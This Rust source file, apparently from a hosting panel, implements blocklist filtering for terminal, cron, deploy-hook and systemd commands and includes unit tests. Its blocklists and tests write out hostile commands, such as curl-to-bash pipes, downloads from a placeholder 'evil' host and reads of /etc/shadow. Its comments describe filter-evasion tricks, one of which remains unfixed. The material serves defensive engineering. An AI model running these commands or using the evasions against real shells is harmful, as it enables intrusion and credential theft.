//! Shared command filtering for terminal input and cron commands.
//!
//! Provides blocklist-based filtering to prevent dangerous commands from being
//! executed through the web terminal or cron system.

/// Commands/patterns blocked in terminal and cron contexts.
const BLOCKED_PATTERNS: &[&str] = &[
    // Destructive filesystem operations
    "rm -rf /", "rm -rf /*", "mkfs", "dd if=", "> /dev/",
    "chmod 777 /", "chown", "passwd", "shadow",
    // Shell chaining / injection
    "|sh", "|bash", "| sh", "| bash",
    ";sh", ";bash", "; sh", "; bash",
    "`", "$(", "eval ", "exec ",
    // Encoding tricks
    "base64", "xxd", "openssl enc", "printf '\\x",
    // Scripting interpreters used for injection (not for legitimate site use)
    "perl", "ruby", "node -e", "php -r",
    "python -c", "python2 -c", "python3 -c",
    "python -m http", "python3 -m http",
    // Network exfiltration
    "nc ", "ncat ", "socat ", "telnet ",
    "curl", "wget",
    // Sensitive files
    "/etc/passwd", "/etc/shadow", "/etc/sudoers",
    // Shell operators ("; " blocks chaining, but && and || are allowed in cron for legitimate use)
    "; ",
    // Write to system paths
    "> /etc/", "> /root/", "> /var/",
    "< /etc/", "< /root/",
    // System control
    "shutdown", "reboot", "init ",
    // User management
    "useradd", "userdel", "usermod", "adduser", "addgroup",
    // Null bytes
    "\\x", "\\0",
];

/// Additional patterns blocked specifically in the web terminal
/// (these are OK in crons which run non-interactively as root).
const TERMINAL_BLOCKED_PATTERNS: &[&str] = &[
    // Privilege escalation
    "su ", "su\t", "sudo ",
    // Package management (can install backdoors)
    "apt ", "apt-get ", "dpkg ", "yum ", "dnf ", "snap ",
    // Service manipulation
    "systemctl ", "service ",
    // Kernel modules
    "insmod ", "modprobe ", "rmmod ", "kexec ",
    // Container / namespace / capability escape
    "docker ", "nsenter ", "unshare ", "chroot ", "pivot_root ", "capsh ", "mknod ", "debugfs ",
    // Disk/mount operations
    "mount ", "umount ", "fdisk ", "parted ",
    // SSH key manipulation
    "ssh-keygen", "authorized_keys",
    // Cron manipulation (bypass the managed cron system)
    "crontab",
    // Process signals to other processes
    "kill ", "killall ", "pkill ",
    // Shell operators (blocked in terminal but allowed in cron)
    "||", "&&",
    // Network config
    "iptables", "ip6tables", "nft ", "ufw ",
    // Reading other sites.
    //
    // ⚠ READ THE SCOPE LIMIT BELOW BEFORE TREATING THIS AS A TENANT BOUNDARY.
    //
    // `/var/www/` alone matched only the ABSOLUTE spelling, and the site shell's
    // own working directory is INSIDE `/var/www`, so the relative form walked
    // straight past it: `cat ../other-site.com/wp-config.php` — another tenant's
    // database credentials — was never examined by this list. `..` closes that
    // spelling. It is not legitimate input from a shell whose entire purpose is a
    // session inside one site's directory: every path a caller needs is at or
    // below the cwd.
    //
    // Blunt on purpose, and the cost is worth naming rather than hiding: this is a
    // SUBSTRING match, so `echo "done..."` is refused too. The narrower `"../"` was
    // considered and rejected — it still admits a bare `cd ..`, after which every
    // subsequent path is an ordinary relative name and the guard has nothing left
    // to match. A pattern that one command steps around is worse than a blunt one,
    // because it reads as protection.
    //
    // SITE terminals only: both call sites in `routes/terminal.rs` (`:545`, `:624`)
    // test `is_site_terminal` first, so an administrator's server shell still takes
    // `cd ..` normally.
    "/var/www/", "..",
];

/// ⚠ THE SCOPE LIMIT OF THE TWO PATTERNS ABOVE, stated here rather than left to
/// be discovered by whoever trusts them next.
///
/// **This blocklist is a speed bump, not a tenant boundary, and it cannot be made
/// into one.** There is no filesystem confinement behind it: the site-shell spawn
/// in `routes/terminal.rs` performs `setgid`/`setuid`/`umask`/`chdir` and starts
/// `bash --restricted` — no `chroot`, no mount namespace, no bind mount. Every
/// site's PHP-FPM pool and every site tree resolve to the SAME `www-data` uid, so
/// two tenants are one principal to the kernel and mode bits cannot separate them.
/// `bash --restricted` does not help either: rbash forbids slashes in COMMAND
/// NAMES, not in arguments.
///
/// So this list closes the two spellings a person actually types. A caller who
/// wants the file can still reach it — through a symlink, through an editor's
/// open dialog, through any interpreter, or by any spelling nobody has enumerated.
/// A real boundary is a per-site uid or a namespace at spawn time, and it is a
/// different change from this one.
///
/// **The same honest bound applies to every KEYWORD in `BLOCKED_PATTERNS`/
/// `TERMINAL_BLOCKED_PATTERNS`, not just the two path spellings above — and
/// it goes deeper than the quote/backslash evasion `normalize_for_blocklist`
/// closes.** `routes/terminal.rs` filters one COMPLETED LINE at a time
/// against a REAL, PERSISTENT `bash --restricted` process, so bash's own
/// state (variables, functions) survives across lines even though this
/// blocklist has no memory of them. A blocked keyword can be assembled from
/// pieces with no adjacent literal substring on any single line — verified
/// live, s445:
///
///     X=$'\143url'          (ANSI-C octal escape: bash decodes \143 → 'c';
///                             normalize_for_blocklist only strips quotes/
///                             backslashes, it does not decode escapes)
///     $X --version           (no "curl" substring on THIS line either — X
///                             was set on the line before, which this
///                             function never sees)
///
/// Both lines pass `is_safe_terminal_command` individually. No per-line
/// substring check — however the substring is normalized — can see this,
/// because the danger is in the RELATIONSHIP between two lines, not in
/// either line's text. This is not a hypothetical: `X=curl; $X --version`
/// (unobfuscated) already runs in `bash --restricted --norc --noprofile`
/// today; the ANSI-C form above just avoids the *literal* "curl" substring
/// the plain form would still trip. Recorded as an open, unfixed item in
/// `project_dockpanel_tech_debt_p184` rather than patched here: blocking
/// bare shell-assignment syntax would have real false-positive cost
/// (`FOO=bar wp cache flush` is a legitimate one-liner) for a mitigation
/// that still doesn't touch aliases/functions/`source`/`read`, so this is
/// the same class of "different change" the paragraph above already
/// concedes for filesystem confinement — egress control scoped to the
/// terminal's own process tree, or dropping outbound network tools from the
/// site-terminal's reachable PATH, is the shape of a real fix.
const _SITE_SHELL_IS_NOT_A_SANDBOX: () = ();

/// Reduce ordinary shell quoting/escaping so keyword-blocklist matching sees
/// what the shell will actually run, not what was literally typed.
///
/// `cu''rl -o /tmp/p http://evil` and `w\get -qO- http://evil` contain no
/// `curl`/`wget` SUBSTRING, so every check below that does a plain
/// `lower.contains("curl")` waved them through — but `bash --restricted
/// --norc --noprofile` (the exact invocation `routes/terminal.rs` spawns)
/// removes the quotes/backslash before exec, and runs the real binary.
/// `dockpanel-fanout` s445 reproduced this live against that exact
/// invocation, and independently against `is_safe_cron_command`'s target
/// (`bash -c`).
///
/// This is deliberately NOT a shell parser — it only deletes quote/backslash
/// characters, so it can only make MORE things match a keyword, never fewer.
/// It does not close every evasion of a keyword blocklist against a real,
/// persistent, Turing-complete shell: ANSI-C escapes (`$'\143url'`),
/// arithmetic/parameter expansion, and command-name indirection via a shell
/// variable set on a PRIOR line (`X=cu''rl` then `$X --version` — state a
/// per-line check cannot see) all still construct `curl` without ever
/// spelling it as an adjacent literal substring. See
/// `_SITE_SHELL_IS_NOT_A_SANDBOX` below and
/// `project_dockpanel_tech_debt_p184` for why that residual class is a
/// different, architectural change, not a blocklist patch.
fn normalize_for_blocklist(cmd: &str) -> String {
    let mut out = String::with_capacity(cmd.len());
    let mut chars = cmd.chars();
    while let Some(c) = chars.next() {
        match c {
            '\'' | '"' => {} // quote-splitting: cu''rl / "cu"'rl' → curl
            '\\' => {
                // Outside single quotes, bash drops the backslash and keeps
                // the next character literally; mirror that for matching.
                if let Some(next) = chars.next() {
                    out.push(next);
                }
                // A trailing lone backslash has nothing to escape — drop it.
            }
            _ => out.push(c),
        }
    }
    out
}

/// Check if a command string is safe for cron execution.
/// Rejects shell metacharacters and dangerous patterns.
pub fn is_safe_cron_command(cmd: &str) -> bool {
    if cmd.is_empty() || cmd.len() > 4096 || cmd.contains('\0') || cmd.contains('\n') || cmd.contains('\r') {
        return false;
    }

    // Reject shell metacharacters that enable chaining/substitution. A bare
    // `;` always chains regardless of exit status and was never the
    // legitimate case this function exists to allow (only `&&`/`||` are,
    // per the BLOCKED_PATTERNS comment below) — reject it outright, same as
    // backtick/`$(`. The OLD "| "/"|/" substring checks required a trailing
    // space or slash and passed straight through on "id|whoami" (no space) —
    // a bare (unpaired) `|` chains just as effectively as `;`; only a PAIRED
    // `||` is the legitimate operator, so scan runs of `|` and reject any
    // run whose length isn't exactly 2.
    if cmd.contains('`') || cmd.contains("$(") || cmd.contains(';')
        || cmd.contains("<(") || cmd.contains("<<")
    {
        return false;
    }
    {
        let bytes = cmd.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'|' {
                let start = i;
                while i < bytes.len() && bytes[i] == b'|' {
                    i += 1;
                }
                if i - start != 2 {
                    return false;
                }
            } else {
                i += 1;
            }
        }
    }
    // A bare `&` backgrounds a command and, mid-string, acts as a chain
    // separator exactly like `;`/`|` — `id&whoami` runs both. Only a PAIRED
    // `&&` is the legitimate operator; the same run-length scan used for `|`
    // above applies here, and for the identical reason it was needed there:
    // this codebase had no check on `&` at all until this fix.
    // A bare `&` backgrounds a command and, mid-string, acts as a chain
    // separator exactly like `;`/`|` — `id&whoami` runs both. Only a PAIRED
    // `&&` is the legitimate operator; the same run-length scan used for `|`
    // above applies here, and for the identical reason it was needed there:
    // this codebase had no check on `&` at all until this fix.
    {
        let bytes = cmd.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'&' {
                let start = i;
                while i < bytes.len() && bytes[i] == b'&' {
                    i += 1;
                }
                if i - start != 2 {
                    return false;
                }
            } else {
                i += 1;
            }
        }
    }

    let lower = normalize_for_blocklist(cmd).to_lowercase();
    !BLOCKED_PATTERNS.iter().any(|b| lower.contains(b))
}

/// Check if a terminal input line is safe.
/// Applies both the base blocklist and terminal-specific blocks.
pub fn is_safe_terminal_command(cmd: &str) -> bool {
    if cmd.trim().is_empty() {
        return true; // empty input is fine (just pressing Enter)
    }

    let lower = normalize_for_blocklist(cmd).to_lowercase();

    // Check base blocked patterns
    if BLOCKED_PATTERNS.iter().any(|b| lower.contains(b)) {
        return false;
    }

    // Check terminal-specific blocked patterns
    if TERMINAL_BLOCKED_PATTERNS.iter().any(|b| lower.contains(b)) {
        return false;
    }

    true
}

/// Suspicious patterns that should trigger real-time alerting (Feature 4).
/// These are commands that indicate potential attack activity, even on server terminals
/// where they aren't blocked (e.g., admin running su, useradd).
const SUSPICIOUS_PATTERNS: &[&str] = &[
    "useradd", "adduser", "usermod", "chpasswd", "passwd",
    "su ", "su\t", "sudo ",
    "rm -rf /", "rm -rf /*",
    "curl|bash", "curl | bash", "wget|bash", "wget | bash",
    "curl -s|sh", "curl -sL|bash", "| sh", "| bash",
    "chmod 777", "chmod 4",  // setuid
    "/etc/shadow", "/etc/sudoers",
    "ssh-keygen", "authorized_keys",
    "nc -l", "ncat -l",  // listeners
    "python -m http.server", "python3 -m http.server",
    "base64 -d", "base64 --decode",
    "crontab -e", "crontab -r",
];

/// Validate a command for use in docker exec hooks (git deploy post-deploy commands).
/// Rejects shell metacharacters and dangerous patterns but allows general commands.
pub fn is_safe_hook_command(command: &str) -> bool {
    if command.trim().is_empty() {
        return false;
    }
    // Reject newlines
    if command.contains('\n') || command.contains('\r') || command.contains('\0') {
        return false;
    }
    // Reject shell metacharacters that enable injection
    let forbidden_chars = ['`', '$', '|', ';', '&', '<', '>', '\\', '!', '{', '}'];
    for ch in &forbidden_chars {
        if command.contains(*ch) {
            return false;
        }
    }
    // Reject known dangerous patterns. Routed through `normalize_for_blocklist`
    // like every sibling in this file — otherwise `r'm' -rf /` contains no
    // "rm -rf /" substring and passes this scan, then `sh -c` (the real
    // shell `git_build.rs::run_hook` execs it through) strips the quotes and
    // runs exactly that.
    let lower = normalize_for_blocklist(command).to_lowercase();
    let dangerous = ["rm -rf /", "mkfs", "dd if=", "> /dev/", "eval ", "exec ",
                      "/etc/shadow", "/etc/passwd", "shutdown", "reboot"];
    for pattern in &dangerous {
        if lower.contains(pattern) {
            return false;
        }
    }
    true
}

/// Check if a command is suspicious (should trigger alert, even if allowed on server terminals).
pub fn is_suspicious_command(cmd: &str) -> bool {
    if cmd.trim().is_empty() {
        return false;
    }
    let lower = normalize_for_blocklist(cmd).to_lowercase();
    SUSPICIOUS_PATTERNS.iter().any(|p| lower.contains(p))
}

/// Validate a command for use in a systemd ExecStart directive.
/// Only allows whitelisted prefixes and rejects injection characters.
pub fn is_safe_exec_start(command: &str, runtime: &str) -> Result<(), String> {
    // Reject empty
    if command.trim().is_empty() {
        return Err("Command cannot be empty".into());
    }

    // Reject newlines (systemd unit injection)
    if command.contains('\n') || command.contains('\r') {
        return Err("Command must not contain newlines".into());
    }

    // Reject null bytes
    if command.contains('\0') {
        return Err("Command must not contain null bytes".into());
    }

    // Reject shell metacharacters and systemd specifiers
    // '%' blocks systemd specifier injection (%h=home, %u=user, %t=runtime dir)
    let forbidden_chars = ['`', '$', '|', ';', '&', '<', '>', '\\', '!', '{', '}', '%'];
    for ch in &forbidden_chars {
        if command.contains(*ch) {
            return Err(format!("Command must not contain '{ch}'"));
        }
    }

    // Whitelist allowed command prefixes per runtime
    let allowed_prefixes: &[&str] = match runtime {
        "node" => &[
            "node ", "npm ", "npx ", "yarn ", "pnpm ",
            "node\t", "npm\t", "npx\t", "yarn\t", "pnpm\t",
            // Allow bare filenames (e.g. "server.js" which gets prefixed with "node")
        ],
        "python" => &[
            "python ", "python3 ", "gunicorn ", "uvicorn ", "flask ", "django",
            "python\t", "python3\t", "gunicorn\t", "uvicorn\t", "flask\t",
        ],
        _ => &[],
    };

    // For node/python, if command starts with a known prefix OR doesn't contain spaces
    // (bare filename like "server.js" or "app.py"), it's OK
    if !allowed_prefixes.is_empty() {
        let lower = command.to_lowercase();
        let has_prefix = allowed_prefixes.iter().any(|p| lower.starts_with(p));
        let is_bare_filename = !command.contains(' ') && !command.contains('/');
        if !has_prefix && !is_bare_filename {
            return Err(format!(
                "Command for {runtime} runtime must start with an allowed prefix or be a bare filename"
            ));
        }
    }

    // Reject absolute paths that escape the working directory
    if command.contains("..") {
        return Err("Command must not contain '..'".into());
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_cron_commands() {
        assert!(is_safe_cron_command("cd /var/www/mysite && php artisan schedule:run"));
        assert!(!is_safe_cron_command("rm -rf /"));
        assert!(!is_safe_cron_command("cat /etc/shadow"));
        assert!(!is_safe_cron_command(""));
    }

    /// `dockpanel-fanout` s429: a bare `;`/`|` (no trailing space, no "sh"/
    /// "bash" suffix) passed straight through the old space/verb-anchored
    /// checks — `is_safe_cron_command("id;whoami")` returned `true`, and the
    /// command reaches `crontab -u root -` and `bash -c` on the host as root.
    /// `&&`/`||` must keep working — that's the whole reason this function
    /// doesn't just ban every shell metacharacter outright.
    #[test]
    fn test_cron_bare_chain_operators_rejected_paired_operators_kept() {
        // The exact bypass strings the audit's finder+skeptic reproduced live.
        assert!(!is_safe_cron_command("id;whoami"));
        assert!(!is_safe_cron_command("id|whoami"));
        assert!(!is_safe_cron_command("id ;whoami"));
        assert!(!is_safe_cron_command("id; whoami")); // the OLD "; " check alone is not enough on its own
        assert!(!is_safe_cron_command("legit-command;curl http://x/y|bash"));
        assert!(!is_safe_cron_command("a|||b")); // not valid `||` syntax either; must not slip through
        // The documented legitimate case must still work.
        assert!(is_safe_cron_command("cd /var/www/mysite && php artisan schedule:run"));
        assert!(is_safe_cron_command("backup.sh || notify-fail.sh"));
        assert!(is_safe_cron_command("a && b || c"));
    }

    #[test]
    fn test_cron_bare_ampersand_rejected_paired_kept() {
        // The completeness-critic's executed PoC strings: `;` and `|` were fixed,
        // `&` was not — a bare `&` chains just as effectively (background + continue).
        assert!(!is_safe_cron_command("id&whoami"));
        assert!(!is_safe_cron_command("id & whoami"));
        assert!(!is_safe_cron_command("echo hi & whoami > /tmp/pwned"));
        assert!(!is_safe_cron_command("a&&&b")); // not valid `&&` syntax either; must not slip through
        // The documented legitimate case must still work.
        assert!(is_safe_cron_command("backup.sh && verify.sh"));
        assert!(is_safe_cron_command("a && b && c"));
    }

    /// `dockpanel-fanout` s445 (finder + skeptic, live-reproduced against the
    /// exact `bash --restricted --norc --noprofile` invocation
    /// `routes/terminal.rs` spawns): `cu''rl`/`w\get` contain no `curl`/
    /// `wget` SUBSTRING, so the raw-string blocklist waved them through while
    /// the shell ran the real binary after quote-removal/backslash-escaping.
    #[test]
    fn test_terminal_quote_and_backslash_evasion_rejected() {
        assert!(!is_safe_terminal_command("cu''rl -o /tmp/p http://evil"));
        assert!(!is_safe_terminal_command("cu\"\"rl -o /tmp/p http://evil"));
        assert!(!is_safe_terminal_command("w\\get -qO- http://evil"));
        assert!(!is_safe_terminal_command("s\\u root"));
        assert!(!is_safe_terminal_command("'d'o'c'k'e'r' ps"));
        // The unobfuscated forms must still be rejected too (no regression).
        assert!(!is_safe_terminal_command("curl -o /tmp/p http://evil"));
        assert!(!is_safe_terminal_command("wget -qO- http://evil"));
        // Ordinary quoting for a LEGITIMATE argument must keep working —
        // this is a substring check either way, so quoting an allowed word
        // was never what made it allowed.
        assert!(is_safe_terminal_command("echo 'hello world'"));
        assert!(is_safe_terminal_command("npm start"));
    }

    #[test]
    fn test_cron_quote_and_backslash_evasion_rejected() {
        assert!(!is_safe_cron_command("cu''rl -o /tmp/p http://evil"));
        assert!(!is_safe_cron_command("w\\get -qO- http://evil"));
        assert!(is_safe_cron_command("backup.sh && verify.sh"));
    }

    #[test]
    fn test_suspicious_quote_and_backslash_evasion_still_detected() {
        // The alerting path uses the same raw-substring technique as the
        // blocklist and was blind to the identical evasion (finder's point:
        // a bypass that defeats the block ALSO defeats the observation).
        assert!(is_suspicious_command("s\\u root"));
        assert!(is_suspicious_command("cu''rl|bash"));
        // Sanity: the unobfuscated form was already (and must remain) detected.
        assert!(is_suspicious_command("curl|bash"));
    }

    #[test]
    fn test_normalize_for_blocklist() {
        assert_eq!(normalize_for_blocklist("cu''rl"), "curl");
        assert_eq!(normalize_for_blocklist("cu\"\"rl"), "curl");
        assert_eq!(normalize_for_blocklist("w\\get"), "wget");
        assert_eq!(normalize_for_blocklist("echo 'hi'"), "echo hi");
        assert_eq!(normalize_for_blocklist("trailing\\"), "trailing");
        assert_eq!(normalize_for_blocklist("plain text"), "plain text");
    }

    #[test]
    fn test_safe_terminal_commands() {
        assert!(is_safe_terminal_command("ls -la"));
        assert!(is_safe_terminal_command("npm start"));
        assert!(!is_safe_terminal_command("su root"));
        assert!(!is_safe_terminal_command("sudo apt install nmap"));
        assert!(!is_safe_terminal_command("docker exec -it foo bash"));
        assert!(!is_safe_terminal_command("cat /etc/passwd"));
        assert!(is_safe_terminal_command("")); // empty is OK
    }

    #[test]
    fn test_safe_exec_start() {
        assert!(is_safe_exec_start("node server.js", "node").is_ok());
        assert!(is_safe_exec_start("npm start", "node").is_ok());
        assert!(is_safe_exec_start("server.js", "node").is_ok());
        assert!(is_safe_exec_start("gunicorn app:app", "python").is_ok());
        assert!(is_safe_exec_start("app.py", "python").is_ok());

        // Injection attempts
        assert!(is_safe_exec_start("node server.js\nExecStart=/bin/bash", "node").is_err());
        assert!(is_safe_exec_start("node server.js; rm -rf /", "node").is_err());
        assert!(is_safe_exec_start("$(whoami)", "node").is_err());
        assert!(is_safe_exec_start("bash -c 'reverse shell'", "node").is_err());

        // Systemd specifier injection
        assert!(is_safe_exec_start("npm start%h", "node").is_err());
        assert!(is_safe_exec_start("node %u", "node").is_err());
        assert!(is_safe_exec_start("node server.js %t", "node").is_err());
    }

    #[test]
    fn test_hook_command_quote_split_evasion_rejected() {
        // Completeness critic's s454 find: `is_safe_hook_command` was the one
        // function in this file NOT routed through `normalize_for_blocklist`,
        // so the same quote-splitting evasion the cron/terminal/suspicious
        // checks already close was still open on the git-deploy hook sink
        // (`sh -c` in `routes/git_build.rs::run_hook`).
        assert!(!is_safe_hook_command("rm -rf /"));
        assert!(!is_safe_hook_command("r'm' -rf /"));
        assert!(!is_safe_hook_command("r\"m\" -rf /"));
        assert!(!is_safe_hook_command("cat /etc/pa''sswd"));
        assert!(!is_safe_hook_command("sh'u'tdown -h now"));
        // Sanity: the unobfuscated forms were already (and must remain) rejected.
        assert!(!is_safe_hook_command("cat /etc/passwd"));
        assert!(!is_safe_hook_command("reboot"));
        // Legitimate hook commands must still pass.
        assert!(is_safe_hook_command("npm run build"));
        assert!(is_safe_hook_command("composer install --no-dev"));
    }
}
